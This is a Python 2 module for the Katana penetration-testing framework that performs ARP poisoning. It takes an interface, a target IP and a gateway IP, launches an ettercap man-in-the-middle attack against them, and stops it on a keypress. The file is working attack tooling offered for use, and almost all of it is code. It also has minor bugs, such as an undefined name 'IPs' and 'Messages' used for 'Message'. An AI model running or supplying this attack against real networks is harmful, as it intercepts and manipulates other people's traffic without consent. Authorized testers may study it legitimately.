# This module requires katana framework 
# https://github.com/RedToor/Katana
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core.Setting import *    #
from core import Errors       #
from core import getFunction  #
import sys                    #
Message=DESIGN()              #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

# INFORMATION MODULE
def initialize():
	initialize.Author             ="RedToor"
	initialize.Version            ="3.0"
	initialize.Despcription       ="ARP Poisoning"
	initialize.CodeName           ="net/at.arpsp"
	initialize.DateCreation       ="26/08/2015"      
	initialize.LastModification   ="01/04/2016"

	# DEFAULT VARIABLES             VALUE                        NAME        RQ     DESCRIPTION
	initialize.DEFAULT_VARIABLE   =[["eth0"                   , "inter"   , "yes" , "Interface"]]    #[0][0]
	initialize.DEFAULT_VARIABLE  +=[["192.168.1.223"          , "target"  , "yes" , "Target IP"]]    #[1][0]
	initialize.DEFAULT_VARIABLE  +=[[getFunction.get_gateway(), "gatew"   , "yes" , "Gateway IP"]]   #[2][0]
initialize()
# END INFORMATION MODULE

# MAIN FUNCTION
def main(run):
	try:
		# HEAD MODULE
		if run:	actions=raw_input(Message.prompt(initialize.CodeName))
		else  : actions="run"
		if   getFunction.KatanaCheckActionShowOptions(actions):getFunction.ShowOptions(initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionSetValue(actions)   :initialize.DEFAULT_VARIABLE=getFunction.UpdateValue(actions,initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionSaveValue(actions)  :getFunction.SaveValue(actions,IPs)
		elif getFunction.KatanaCheckActionisBack(actions)     :return
		# END HEAD MODULE
		elif getFunction.runModule(actions):
			Message.run()
			# CODE MODULE    ############################################################################################
			try:
				if getFunction.isConect():
					if getFunction.checkDevice(initialize.DEFAULT_VARIABLE[0][0]):
						print " "+Alr+" Starting ARP Poisoning..."
						getFunction.Subprocess("ettercap -T -M ARP /"+initialize.DEFAULT_VARIABLE[1][0]+"// /"+initialize.DEFAULT_VARIABLE[2][0]+"// -i "+initialize.DEFAULT_VARIABLE[0][0])
						NULL=raw_input(" "+Hlp+" Stop Attack ARP (PRESS ANY KEY)")
						print " "+Alr+" Stopping ARP Poisoning...", getFunction.status_cmd('killall ettercap','\t\t\t\t')
					else:
						Messages.NoDeviceFound(initialize.DEFAULT_VARIABLE[0][0])
				else:
					Message.Noconnect()
			except:
				Errors.Errors(event=sys.exc_info(), info=False)
			# END CODE MODULE ############################################################################################
		else:
			getFunction.KatanaCheckActionGlobalCommands(actions)
	# ERROR GENERAL
	except:
		Errors.Errors(event=sys.exc_info(), info=sys.exc_traceback.tb_lineno)
	# END ERROR GENERAL
	main(True)
# END MAIN FUNCTION

# LINKER FUNCTION
def run(interface, target, gateway):
	initialize.DEFAULT_VARIABLE [0][0] = interface
	initialize.DEFAULT_VARIABLE [1][0] = target
	initialize.DEFAULT_VARIABLE [2][0] = gateway
	main(False)
# END LINKER FUNCTION
